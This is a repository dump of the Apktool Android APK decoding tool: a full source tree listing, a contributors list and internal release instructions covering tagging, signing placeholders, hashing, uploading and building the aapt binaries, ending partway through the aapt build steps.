Project Path: arc_gmh5225_Apktool_pdjtrhfl

Source Tree:

```txt
arc_gmh5225_Apktool_pdjtrhfl
├── CONTRIBUTORS.md
├── INTERNAL.md
├── LICENSE.md
├── README.md
├── ROADMAP.md
├── SECURITY.md
├── brut.apktool
│   ├── apktool-cli
│   │   ├── build.gradle
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── brut
│   │                   └── apktool
│   │                       └── Main.java
│   └── apktool-lib
│       ├── build.gradle
│       └── src
│           ├── main
│           │   ├── java
│           │   │   ├── android
│           │   │   │   ├── content
│           │   │   │   │   └── res
│           │   │   │   │       └── XmlResourceParser.java
│           │   │   │   └── util
│           │   │   │       ├── AttributeSet.java
│           │   │   │       └── TypedValue.java
│           │   │   ├── brut
│           │   │   │   └── androlib
│           │   │   │       ├── Androlib.java
│           │   │   │       ├── AndrolibException.java
│           │   │   │       ├── ApkDecoder.java
│           │   │   │       ├── ApktoolProperties.java
│           │   │   │       ├── err
│           │   │   │       │   ├── AXmlDecodingException.java
│           │   │   │       │   ├── CantFind9PatchChunkException.java
│           │   │   │       │   ├── CantFindFrameworkResException.java
│           │   │   │       │   ├── InFileNotFoundException.java
│           │   │   │       │   ├── OutDirExistsException.java
│           │   │   │       │   ├── RawXmlEncounteredException.java
│           │   │   │       │   └── UndefinedResObjectException.java
│           │   │   │       ├── meta
│           │   │   │       │   ├── ClassSafeConstructor.java
│           │   │   │       │   ├── EscapedStringRepresenter.java
│           │   │   │       │   ├── MetaInfo.java
│           │   │   │       │   ├── PackageInfo.java
│           │   │   │       │   ├── UsesFramework.java
│           │   │   │       │   ├── VersionInfo.java
│           │   │   │       │   └── YamlStringEscapeUtils.java
│           │   │   │       ├── mod
│           │   │   │       │   └── SmaliMod.java
│           │   │   │       ├── options
│           │   │   │       │   └── BuildOptions.java
│           │   │   │       ├── res
│           │   │   │       │   ├── AndrolibResources.java
│           │   │   │       │   ├── data
│           │   │   │       │   │   ├── ResConfigFlags.java
│           │   │   │       │   │   ├── ResID.java
│           │   │   │       │   │   ├── ResPackage.java
│           │   │   │       │   │   ├── ResResSpec.java
│           │   │   │       │   │   ├── ResResource.java
│           │   │   │       │   │   ├── ResTable.java
│           │   │   │       │   │   ├── ResType.java
│           │   │   │       │   │   ├── ResTypeSpec.java
│           │   │   │       │   │   ├── ResUnknownFiles.java
│           │   │   │       │   │   ├── ResValuesFile.java
│           │   │   │       │   │   └── value
│           │   │   │       │   │       ├── ResArrayValue.java
│           │   │   │       │   │       ├── ResAttr.java
│           │   │   │       │   │       ├── ResBagValue.java
│           │   │   │       │   │       ├── ResBoolValue.java
│           │   │   │       │   │       ├── ResColorValue.java
│           │   │   │       │   │       ├── ResDimenValue.java
│           │   │   │       │   │       ├── ResEmptyValue.java
│           │   │   │       │   │       ├── ResEnumAttr.java
│           │   │   │       │   │       ├── ResFileValue.java
│           │   │   │       │   │       ├── ResFlagsAttr.java
│           │   │   │       │   │       ├── ResFloatValue.java
│           │   │   │       │   │       ├── ResFractionValue.java
│           │   │   │       │   │       ├── ResIdValue.java
│           │   │   │       │   │       ├── ResIntBasedValue.java
│           │   │   │       │   │       ├── ResIntValue.java
│           │   │   │       │   │       ├── ResPluralsValue.java
│           │   │   │       │   │       ├── ResReferenceValue.java
│           │   │   │       │   │       ├── ResScalarValue.java
│           │   │   │       │   │       ├── ResStringValue.java
│           │   │   │       │   │       ├── ResStyleValue.java
│           │   │   │       │   │       ├── ResValue.java
│           │   │   │       │   │       └── ResValueFactory.java
│           │   │   │       │   ├── decoder
│           │   │   │       │   │   ├── ARSCDecoder.java
│           │   │   │       │   │   ├── AXmlResourceParser.java
│           │   │   │       │   │   ├── AndroidManifestResourceParser.java
│           │   │   │       │   │   ├── Res9patchStreamDecoder.java
│           │   │   │       │   │   ├── ResAttrDecoder.java
│           │   │   │       │   │   ├── ResFileDecoder.java
│           │   │   │       │   │   ├── ResRawStreamDecoder.java
│           │   │   │       │   │   ├── ResStreamDecoder.java
│           │   │   │       │   │   ├── ResStreamDecoderContainer.java
│           │   │   │       │   │   ├── StringBlock.java
│           │   │   │       │   │   ├── StyledString.java
│           │   │   │       │   │   └── XmlPullStreamDecoder.java
│           │   │   │       │   ├── util
│           │   │   │       │   │   ├── ExtFile.java
│           │   │   │       │   │   ├── ExtMXSerializer.java
│           │   │   │       │   │   └── ExtXmlSerializer.java
│           │   │   │       │   └── xml
│           │   │   │       │       ├── ResValuesXmlSerializable.java
│           │   │   │       │       ├── ResXmlEncodable.java
│           │   │   │       │       ├── ResXmlEncoders.java
│           │   │   │       │       └── ResXmlPatcher.java
│           │   │   │       └── src
│           │   │   │           ├── SmaliBuilder.java
│           │   │   │           └── SmaliDecoder.java
│           │   │   └── org
│           │   │       └── xmlpull
│           │   │           └── renamed
│           │   │               └── MXSerializer.java
│           │   └── resources
│           │       ├── brut
│           │       │   └── androlib
│           │       │       └── android-framework.jar
│           │       ├── prebuilt
│           │       │   ├── linux
│           │       │   │   ├── aapt
│           │       │   │   ├── aapt2
│           │       │   │   ├── aapt2_64
│           │       │   │   └── aapt_64
│           │       │   ├── macosx
│           │       │   │   ├── aapt2_64
│           │       │   │   └── aapt_64
│           │       │   └── windows
│           │       │       ├── aapt.exe
│           │       │       ├── aapt2.exe
│           │       │       ├── aapt2_64.exe
│           │       │       └── aapt_64.exe
│           │       └── properties
│           │           └── apktool.properties
│           └── test
│               ├── java
│               │   └── brut
│               │       └── androlib
│               │           ├── BaseTest.java
│               │           ├── TestUtils.java
│               │           ├── aapt1
│               │           │   ├── AndroidOreoNotSparseTest.java
│               │           │   ├── AndroidOreoSparseTest.java
│               │           │   ├── BuildAndDecodeJarTest.java
│               │           │   ├── BuildAndDecodeTest.java
│               │           │   ├── DebugTagRetainedTest.java
│               │           │   ├── DefaultBaksmaliVariableTest.java
│               │           │   ├── EmptyResourcesArscTest.java
│               │           │   ├── LargeIntsInManifestTest.java
│               │           │   ├── ProviderAttributeTest.java
│               │           │   ├── ReferenceVersionCodeTest.java
│               │           │   ├── SharedLibraryTest.java
│               │           │   ├── SkipAssetTest.java
│               │           │   └── UnknownCompressionTest.java
│               │           ├── aapt2
│               │           │   ├── BuildAndDecodeTest.java
│               │           │   ├── DebuggableFalseChangeToTrueTest.java
│               │           │   ├── DebuggableTrueAddedTest.java
│               │           │   ├── DebuggableTrueRetainedTest.java
│               │           │   ├── NetworkConfigTest.java
│               │           │   ├── NoNetworkConfigTest.java
│               │           │   └── NonStandardPkgIdTest.java
│               │           ├── androlib
│               │           │   └── InvalidSdkBoundingTest.java
│               │           ├── decode
│               │           │   ├── AndResGuardTest.java
│               │           │   ├── DecodeArrayTest.java
│               │           │   ├── DecodeKotlinCoroutinesTest.java
│               │           │   ├── DecodeKotlinTest.java
│               │           │   ├── DoubleExtensionUnknownFileTest.java
│               │           │   ├── DuplicateDexTest.java
│               │           │   ├── Empty9PatchTest.java
│               │           │   ├── ExternalEntityTest.java
│               │           │   ├── ForceManifestDecodeNoResourcesTest.java
│               │           │   ├── MinifiedArscTest.java
│               │           │   ├── MissingDiv9PatchTest.java
│               │           │   ├── MissingVersionManifestTest.java
│               │           │   ├── OutsideOfDirectoryEntryTest.java
│               │           │   ├── ParentDirectoryTraversalTest.java
│               │           │   └── VectorDrawableTest.java
│               │           ├── encoders
│               │           │   └── PositionalEnumerationTest.java
│               │           ├── res
│               │           │   ├── decoder
│               │           │   │   └── StringBlockWithSurrogatePairInUtf8Test.java
│               │           │   └── src
│               │           │       └── DexStaticFieldValueTest.java
│               │           ├── util
│               │           │   ├── AaptVersionTest.java
│               │           │   └── UnknownDirectoryTraversalTest.java
│               │           └── yaml
│               │               └── MaliciousYamlTest.java
│               └── resources
│                   ├── aapt1
│                   │   ├── issue1234
│                   │   │   └── issue1234.apk
│                   │   ├── issue1235
│                   │   │   ├── AndroidManifest.xml
│                   │   │   ├── apktool.yml
│                   │   │   └── res
│                   │   │       └── values
│                   │   │           └── strings.xml
│                   │   ├── issue1481
│                   │   │   ├── apktool.yml
│                   │   │   └── smali
│                   │   │       └── com
│                   │   │           └── ibotpeaches
│                   │   │               └── issue1481
│                   │   │                   └── BuildConfig.smali
│                   │   ├── issue1594
│                   │   │   ├── not_sparse.apk
│                   │   │   └── sparse.apk
│                   │   ├── issue1605
│                   │   │   └── issue1605.apk
│                   │   ├── issue1730
│                   │   │   └── issue1730.apk
│                   │   ├── issue636
│                   │   │   └── issue636.apk
│                   │   ├── issue767
│                   │   │   └── issue767.apk
│                   │   ├── shared_libraries
│                   │   │   ├── client.apk
│                   │   │   └── library.apk
│                   │   ├── testapp
│                   │   │   ├── AndroidManifest.xml
│                   │   │   ├── apktool.yml
│                   │   │   ├── assets
│                   │   │   │   ├── 0byte_file.jpg
│                   │   │   │   ├── txt
│                   │   │   │   │   └── no-unicode.txt
│                   │   │   │   └── unicode-txt
│                   │   │   │       └── ∂-unicode.txt
│                   │   │   ├── kotlin
│                   │   │   │   └── kotlin.kotlin_builtins
│                   │   │   ├── lib
│                   │   │   │   └── android-support-v13.jar
│                   │   │   ├── libs
│                   │   │   │   └── android-support-v13.jar
│                   │   │   ├── res
│                   │   │   │   ├── drawable-534dpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-anydpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-hdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-ldpi
│                   │   │   │   │   ├── data.jpg
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-mdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-nodpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-tvdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-xhdpi
│                   │   │   │   │   ├── 9patch.9.png
│                   │   │   │   │   ├── 9patch_htc.r.9.png
│                   │   │   │   │   ├── 9patch_samsung.9.qmg
│                   │   │   │   │   ├── btn_zoom_up_normal.9.png
│                   │   │   │   │   ├── ic_launcher.png
│                   │   │   │   │   └── ic_launcher_samsung.qmg
│                   │   │   │   ├── drawable-xxhdpi
│                   │   │   │   │   ├── ic_launcher.png
│                   │   │   │   │   ├── ic_notification_overlay.9.png
│                   │   │   │   │   ├── recents_lower_gradient.9.png
│                   │   │   │   │   ├── screenshot_panel.9.png
│                   │   │   │   │   ├── search_bg_transparent.9.png
│                   │   │   │   │   ├── status_background.9.png
│                   │   │   │   │   └── textfield_activated_holo_dark.9.png
│                   │   │   │   ├── drawable-xxhdpi-v4
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-xxxhdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── font
│                   │   │   │   │   ├── lobster.xml
│                   │   │   │   │   └── lobster_regular.otf
│                   │   │   │   ├── layout
│                   │   │   │   │   ├── issue1040.xml
│                   │   │   │   │   ├── issue1063.xml
│                   │   │   │   │   ├── issue1130.xml
│                   │   │   │   │   ├── issue1157.xml
│                   │   │   │   │   ├── issue1274.xml
│                   │   │   │   │   └── issue1674.xml
│                   │   │   │   ├── raw
│                   │   │   │   │   ├── blank_test.png
│                   │   │   │   │   ├── no_extension
│                   │   │   │   │   └── rain.mp3
│                   │   │   │   ├── values
│                   │   │   │   │   ├── attrs.xml
│                   │   │   │   │   ├── ids.xml
│                   │   │   │   │   ├── integers.xml
│                   │   │   │   │   ├── public.xml
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-ar-rXB
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-ast
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-ast-rES
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-b+ast+Latn+IT+AREVELA
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-b+en+Latn+419
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-b+en+Latn+US
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-b+en+US+POSIX
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-b+eng+419
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-en
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-en-rUS
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-fr
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-ldrtl
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-lowdr-v26
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-mcc001
│                   │   │   │   │   ├── anims.xml
│                   │   │   │   │   ├── arrays.xml
│                   │   │   │   │   ├── bools.xml
│                   │   │   │   │   ├── colors.xml
│                   │   │   │   │   ├── dimens.xml
│                   │   │   │   │   ├── drawables.xml
│                   │   │   │   │   ├── ids.xml
│                   │   │   │   │   ├── integers.xml
│                   │   │   │   │   ├── layouts.xml
│                   │   │   │   │   ├── plurals.xml
│                   │   │   │   │   ├── strings.xml
│                   │   │   │   │   └── styles.xml
│                   │   │   │   ├── values-mcc001-mnc00
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-mcc001-mnc1
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-mcc002
│                   │   │   │   │   ├── arrays.xml
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-mcc003
│                   │   │   │   │   ├── arrays.xml
│                   │   │   │   │   ├── bools.xml
│                   │   │   │   │   ├── integers.xml
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-mcc004-mnc4-en-rUS-ldrtl-sw100dp-w200dp-h300dp-long-round-highdr-land-desk-night-xhdpi-finger-keyssoft-12key-navhidden-dpad-v26
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-mcc238-mnc6
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-mcc238-mnc870
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-mnc1
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-notround
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-nowidecg-v26
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-round
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-vrheadset-v26
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-watch
│                   │   │   │   │   └── strings.xml
│                   │   │   │   ├── values-widecg-v26
│                   │   │   │   │   └── strings.xml
│                   │   │   │   └── xml
│                   │   │   │       ├── literals.xml
│                   │   │   │       ├── references.xml
│                   │   │   │       └── ww_box_styles_schema.xsd
│                   │   │   ├── smali
│                   │   │   │   └── HelloWorld.smali
│                   │   │   ├── smali_classes2
│                   │   │   │   └── HelloDualDexSupport.smali
│                   │   │   ├── smali_classes3
│                   │   │   │   └── HelloTripleDexSupport.smali
│                   │   │   └── unknown
│                   │   │       ├── hidden.file
│                   │   │       ├── lib_bug603
│                   │   │       │   └── bug603
│                   │   │       ├── nonprintable.file
│                   │   │       ├── stored.file
│                   │   │       └── unk_folder
│                   │   │           └── unknown_file
│                   │   ├── testjar
│                   │   │   ├── apktool.yml
│                   │   │   ├── original
│                   │   │   │   └── META-INF
│                   │   │   │       └── MANIFEST.MF
│                   │   │   └── smali
│                   │   │       └── com
│                   │   │           └── apktool
│                   │   │               └── test
│                   │   │                   └── Test.smali
│                   │   └── unknown_compression
│                   │       └── deflated_unknowns.apk
│                   ├── aapt2
│                   │   ├── issue2328
│                   │   │   ├── debuggable-false
│                   │   │   │   ├── AndroidManifest.xml
│                   │   │   │   ├── apktool.yml
│                   │   │   │   └── res
│                   │   │   │       └── values
│                   │   │   │           └── strings.xml
│                   │   │   ├── debuggable-missing
│                   │   │   │   ├── AndroidManifest.xml
│                   │   │   │   ├── apktool.yml
│                   │   │   │   └── res
│                   │   │   │       └── values
│                   │   │   │           └── strings.xml
│                   │   │   └── debuggable-true
│                   │   │       ├── AndroidManifest.xml
│                   │   │       ├── apktool.yml
│                   │   │       └── res
│                   │   │           └── values
│                   │   │               └── strings.xml
│                   │   ├── network_config
│                   │   │   ├── AndroidManifest.xml
│                   │   │   ├── apktool.yml
│                   │   │   ├── res
│                   │   │   │   ├── drawable-hdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-ldpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-mdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-nodpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── drawable-xhdpi
│                   │   │   │   │   └── ic_launcher.png
│                   │   │   │   ├── values
│                   │   │   │   │   ├── public.xml
│                   │   │   │   │   └── strings.xml
│                   │   │   │   └── xml
│                   │   │   │       └── network_security_config.xml
│                   │   │   └── smali
│                   │   │       └── HelloWorld.smali
│                   │   ├── pkgid8
│                   │   │   ├── AndroidManifest.xml
│                   │   │   ├── apktool.yml
│                   │   │   └── res
│                   │   │       └── values
│                   │   │           ├── integers.xml
│                   │   │           ├── public.xml
│                   │   │           └── strings.xml
│                   │   └── testapp
│                   │       ├── AndroidManifest.xml
│                   │       ├── apktool.yml
│                   │       ├── assets
│                   │       │   └── 0byte_file.jpg
│                   │       ├── res
│                   │       │   ├── drawable
│                   │       │   │   ├── $avd_hide_password__0.xml
│                   │       │   │   ├── $avd_show_password__0.xml
│                   │       │   │   ├── $avd_show_password__1.xml
│                   │       │   │   ├── $avd_show_password__2.xml
│                   │       │   │   └── avd_show_password.xml
│                   │       │   ├── drawable-xhdpi
│                   │       │   │   └── ic_launcher_samsung.qmg
│                   │       │   ├── navigation
│                   │       │   │   └── nav_graph.xml
│                   │       │   ├── values
│                   │       │   │   ├── attrs.xml
│                   │       │   │   ├── ids.xml
│                   │       │   │   └── strings.xml
│                   │       │   ├── values-es
│                   │       │   │   └── strings.xml
│                   │       │   └── xml
│                   │       │       └── ww_box_styles_schema.xsd
│                   │       ├── smali
│                   │       │   └── HelloWorld.smali
│                   │       ├── smali_classes2
│                   │       │   └── HelloDualDexSupport.smali
│                   │       └── smali_classes3
│                   │           └── HelloTripleDexSupport.smali
│                   ├── decode
│                   │   ├── doctype
│                   │   │   ├── AndroidManifest.xml
│                   │   │   └── apktool.yml
│                   │   ├── duplicatedex
│                   │   │   └── duplicatedex.apk
│                   │   ├── empty9patch
│                   │   │   └── empty9patch.apk
│                   │   ├── issue1157
│                   │   │   └── issue1157.apk
│                   │   ├── issue1170
│                   │   │   └── issue1170.apk
│                   │   ├── issue1244
│                   │   │   └── issue1244.apk
│                   │   ├── issue1264
│                   │   │   └── issue1264.apk
│                   │   ├── issue1456
│                   │   │   └── issue1456.apk
│                   │   ├── issue1498
│                   │   │   └── issue1498.apk
│                   │   ├── issue1522
│                   │   │   └── pip_dismiss_scrim.9.png
│                   │   ├── issue1589
│                   │   │   └── issue1589.apk
│                   │   ├── issue1680
│                   │   │   └── issue1680.apk
│                   │   ├── issue1994
│                   │   │   └── issue1994.apk
│                   │   ├── issue2543
│                   │   │   ├── AndroidManifest.xml
│                   │   │   ├── apktool.yml
│                   │   │   └── classes.dex
│                   │   ├── kotlin-coroutines
│                   │   │   └── test-kotlin-coroutines.apk
│                   │   └── testkotlin
│                   │       └── testkotlin.apk
│                   ├── util
│                   │   └── traversal
│                   │       └── file
│                   └── yaml
│                       └── cve20220476
│                           ├── AndroidManifest.xml
│                           └── apktool.yml
├── brut.j.common
│   ├── build.gradle
│   └── src
│       ├── main
│       │   └── java
│       │       └── brut
│       │           └── common
│       │               ├── BrutException.java
│       │               ├── InvalidUnknownFileException.java
│       │               ├── RootUnknownFileException.java
│       │               └── TraversalUnknownFileException.java
│       └── templates
│           └── apache2.0-header.txt
├── brut.j.dir
│   ├── build.gradle
│   └── src
│       └── main
│           └── java
│               └── brut
│                   └── directory
│                       ├── AbstractDirectory.java
│                       ├── DirUtil.java
│                       ├── Directory.java
│                       ├── DirectoryException.java
│                       ├── ExtFile.java
│                       ├── FileDirectory.java
│                       ├── PathAlreadyExists.java
│                       ├── PathNotExist.java
│                       ├── ZipRODirectory.java
│                       └── ZipUtils.java
├── brut.j.util
│   ├── build.gradle
│   └── src
│       └── main
│           └── java
│               └── brut
│                   └── util
│                       ├── AaptManager.java
│                       ├── BrutIO.java
│                       ├── DataInputDelegate.java
│                       ├── Duo.java
│                       ├── ExtDataInput.java
│                       ├── Jar.java
│                       ├── OS.java
│                       └── OSDetection.java
├── build.gradle
├── gradle
│   ├── functions.gradle
│   └── wrapper
│       ├── gradle-wrapper.jar
│       └── gradle-wrapper.properties
├── gradlew
├── gradlew.bat
├── scripts
│   ├── linux
│   │   └── apktool
│   ├── osx
│   │   └── apktool
│   └── windows
│       └── apktool.bat
└── settings.gradle

```

`CONTRIBUTORS.md`:

```md
# Apktool Contributors
Copyright 2014 Ryszard Wiśniewski <brut.alll@gmail.com>

This product includes software developed by:

  * Ryszard Wiśniewski (brut.alll@gmail.com)
  * JesusFreke (https://github.com/JesusFreke/smali)
  * Dmitry Skiba (http://code.google.com/p/android4me/)
  * Tahseen Ur Rehman (http://code.google.com/p/radixtree/)
  * Connor Tumbleson (connor.tumbleson@gmail.com)
  * Android Open Source Project (http://source.android.com/)
  * The Apache Software Foundation (https://www.apache.org/)

```

`INTERNAL.md`:

```md
# Releasing a new version.

The steps taken for slicing an official release of Apktool.

### Ensuring proper license headers

Before we build a release, its a good practice to ensure all headers in source files contain
proper licenses.

    ./gradlew licenseMain && ./gradlew licenseTest

If any license violations were found you can automatically fix them with either

    ./gradlew licenseFormatMain
    ./gradlew licenseFormatTest

Like described, one formats the `src/main` directory, while the other formats the `src/test` directory.

### Tagging the release.

Inside `build.gradle` there are two lines.

    apktoolversion_major
    apktoolversion_minor

The major variable should be left unchanged. If done correctly, it will already be the version
you are about to release. In this case `2.2.2`. The minor variable should read `SNAPSHOT` as
the `2.2.2` release up until this point was `SNAPSHOT` releases (Unofficial).

We need to remove the `SNAPSHOT` portion and leave the minor version blank. An example can be
found [here](https://github.com/iBotPeaches/Apktool/commit/96b70d0be7513c5a1e5d3a3b9a75e4e2b076ad79).

After we remove `SNAPSHOT` we need to make the version commit. Organization and following patterns
is crucial here. This commit should have 1 change only - the change above. Now commit this change
with the commit message - `version bump (x.x.x)`.

At this point we now have the commit of the release, but we need to tag it using the following message.

    git tag -a vx.x.x -m "changed version to vx.x.x"

For example for the `2.2.1` release.

    git tag -a v2.2.1 -m "changed version to v2.2.1"

### Prepare for publishing.

New to Apktool is publishing releases to Maven, so plugin authors can directly integrate. You
need a `gradle.properties` file in root with the structure:

```
signing.keyId={gpgKeyId}
signing.password={gpgPassphrase}
signing.secretKeyRingFile={gpgSecretKingRingLocation}

ossrhUsername={sonatypeUsername}
ossrhPassword={sonatypePassword}
```

If `release` or `snapshot` is used publishing will be automatically attempted.

### Building the binary.

In order to maintain a clean slate. Run `gradlew clean` to start from a clean slate. Now lets build
the new version. We should not have any new commits since the tagged commit.

    ./gradlew build shadowJar proguard release

The build should tell you what version you are building and it should match the commits you made previously.

    ➜ Apktool git:(master) ./gradlew build shadowJar proguard release
    Building RELEASE (master): 2.2.2

### Testing the binary.

Now the release binary is built in the same location as all other builds. Run this version against
some of the fixed bugs in this release. This is a simple test to ensure the build had no errors.

Copy the jar to any location to prep for uploading. The pattern we name the jars is

    apktool_x.x.x.jar

Or in the case of the last release - `apktool_2.2.1.jar`

Once you have the jar in this form. Record the md5 hash & sha256 hash of it. This can be done using `md5sum`
and `sha256sum` on unix systems.

This can be shown for the `2.2.2` release like so

    ➜  Desktop md5sum apktool_2.2.2.jar
    1e6be08d3f9bb4b442bb85cf4e21f1c1  apktool_2.2.2.jar

    ➜  Desktop sha256sum apktool-2.2.2.jar
    1f1f186edcc09b8677bc1037f3f812dff89077187b24c8558ca2a89186ea3251  apktool-2.2.2.jar

Remember these hashes. These are the local hashes. These are our master hashes. All others (Bitbucket, Backup)
must match these. If they do not - they are invalid.

### Lets get uploading.

Lets make sure we actually pushed these release changes to the repo (Both Github & Bitbucket)

    git push origin master
    git push origin vx.x.x

    git push bitbucket master
    git push bitbucket vx.x.x

We upload the binaries into 3 places.

1. [Bitbucket Downloads](https://bitbucket.org/iBotPeaches/apktool/downloads)
2. [Github Releases](https://github.com/iBotPeaches/Apktool/releases) - Since `2.2.1`.
3. [Backup Mirror](https://connortumbleson.com/apktool/)
4. [Sonatype (Maven)](https://oss.sonatype.org)

#### Bitbucket

This one is pretty easy. Head to the URL attached to the hyperlink #1 above. There will be a "Add Files"
button on the top right of the page. Upload the `apktool_x.x.x.jar` file.

After it is uploaded. Immediately visit the page and download it. Check the `md5` for a match.

#### GitHub

This option will not work until the tag is pushed. You can head to this [page](https://github.com/iBotPeaches/Apktool/releases/new)
to draft a new release. The `Tag version` dropdown will have the new tag. In this case `v2.2.2`.

Select that option and make the title `Apktool vx.x.x`. There will be a description field on this release.
Hold tight, we link the release blog post in this field, but we can edit the release after the fact to add this.

Upload the binary `apktool_x.x.x.jar` and submit the release.

#### Backup Server

Access to this server is probably limited so this option may not be possible. SSH into the
`connortumbleson.com` server with username `connor`. Head to `public_html/apktool` and upload
the `apktool_x.x.x.jar` to it.

Now re-generate the md5/sha256 hashes for these files.

    md5sum *.jar > md5.md5sum
    sha256 *.jar > sha256.shasum

Check the `md5.md5sum` file for the hashes. The file will look something like this.

    6de3e097943c553da5db2e604bced332  apktool_1.4.10.jar
    ...
    1e6be08d3f9bb4b442bb85cf4e21f1c1  apktool_2.2.2.jar

Additionally check the `sha256.shasum` file for the hashes. This file will look almost identical to the above
except for containing sha256 hashes.

The hashes match so we are good with the backup server.


#### Sonatype

You'll want to log in and view the Staging repostories and confirm you see the recently made build. You'll want to:

 * Close it (Wait for audit report email)
 * Release it (Drop the staging repository)
 * Wait 20min - 2 hours for it to appear [here](https://mvnrepository.com/artifact/org.apktool/apktool-lib)

With those done, time to get writing the release post.

We currently blog the releases on the [Connor Tumbleson personal blog](https://connortumbleson.com/).
This may change and the formatting of these release posts change over time.

Some recent releases for understanding the pattern can be found below.

1. [2.2.1](https://connortumbleson.com/2016/10/18/apktool-v2-2-1-released/)
2. [2.2.0](https://connortumbleson.com/2016/08/07/apktool-v2-2-0-released/)
3. [2.0.2](https://connortumbleson.com/2015/10/12/apktool-v2-0-2-released/)
4. [2.0.0](https://connortumbleson.com/2015/04/20/apktool-v2-0-0-released/)

For obtaining commit authors and counts. The following command does the legwork:

    git shortlog -s -n --all --no-merges --since="05 Sept 2018"

Obviously replacing the date with the release date of the last version.

So write the post. I tend to always include the following:

1. Image of release for featured image when reshared on socials.
2. Quick sentence or two for SEO to describe the meat of this release.
3. Commit count and total for this release with author names.
4. Changelog linking to the bugs that were fixed.
5. Download including the md5/sha256 hash.
6. Link dump to Project Site, GitHub, Bug Tracker and XDA Thread.

Now that you've written this post. We need to go post it in places and update places where
Apktool is released.

### XDA Thread

We have a [thread](https://forum.xda-developers.com/showthread.php?t=1755243) on XDA Developers.
This thread follows the same pattern for all releases.

When writing a response to the XDA thread we follow another pattern of release notes. These examples
can be found below:

1. [2.2.2](https://forum.xda-developers.com/showpost.php?p=70687935&postcount=4635)
2. [2.2.1](http://forum.xda-developers.com/showpost.php?p=69188139&postcount=4478)
3. [2.0.0](http://forum.xda-developers.com/showpost.php?p=60255972&postcount=3063)

### Apktool Website

The Apktool project website has a few locations to update:

1. The homepage intro
2. The download link in header
3. The changelog page
4. The footer of homepage with history of releases.

The easiest way to describe this is to just link to a [previous release](https://github.com/iBotPeaches/Apktool/commit/5ef77bf01cf3625cb1dd1981234b3854b02496e2).

### Update Milestones

Now that we've released a version, we should hopefully have no more tickets in the release just published.
If there are, move those tickets to the next milestone.

You can head to [milestones](https://github.com/iBotPeaches/Apktool/milestones) to close the just
released version and create another.

I tend to create the next release (In this case `2.2.3`) with an ETA of 3 months in the future. This
is just a guideline but helps me to release a new version every 3 months.

### Social Spam

The final step is to send this release into the wild via some social posting. Head to the blog
where the release post was and send that link to Twitter, Google and whatever else you use.

Relax and watch the bug tracker.

# Building aapt binaries.

The steps taken for building our modified aapt binaries for apktool.

### Getting the modified `frameworks/base` repo.
First step is using the [platform_frameworks_base](https://github.com/iBotPeaches/platform_frameworks_base) repo.

While previously unorganized, the repo now follows the branch naming convention depending on the current Android version.
So `apktool_7.1` corresponds to the 7.1 Android release. This branch should work for all `android-7.1.x` tags for AOSP.

We didn't follow this naming convention until Android 7.1. So don't go looking for older versions. The current version
is `apktool-9.0.0`, which corresponds to the Android 9.0 (Pie) release.

This repo has a variety of changes applied. These changes range from disabling optimizations to lessening the rules
that aapt regularly has. We do this because apktool's job is to not fix apks, but rather keep them as close to the
original as they were.

### First we need the AOSP source

As cheesy as it is, just follow this [downloading](https://source.android.com/source/downloading.html) link in order
to get the source downloaded. This is no small download, expect to use 150-250GB.

Some optimization techniques for a smaller clone:

 * `~/bin/repo init -u https://android.googlesource.com/platform/manifest -b master --partial-clone` - Partial clone
 * `repo sync -c` - Only current branch

After that, you need to build AOSP via this [documentation](https://source.android.com/source/building.html) guide. Now
we aren't building the entire AOSP package, the initial build is to just see if you are capable of building it.

We check out a certain tag or branch. Currently we use

 * aapt2 - `master`.
 * aapt1 - `master`.

### Including our modified `frameworks/base` package.

There is probably a more automated way to do this, but for now:

1. `cd frameworks/base`
2. `git remote add origin git@github.com:iBotPeaches/platform_frameworks_base.git`
3. `git fetch origin -v`
4. `git checkout origin/master`

### Building the aapt1 (Legacy) binary.

The steps below are different per flavor and operating system.

#### Linux / Windows
1. `source build/envsetup.sh`
2. `lunch sdk-eng`
3. `m aapt`
4. `strip out/host/linux-x86/bin/aapt`
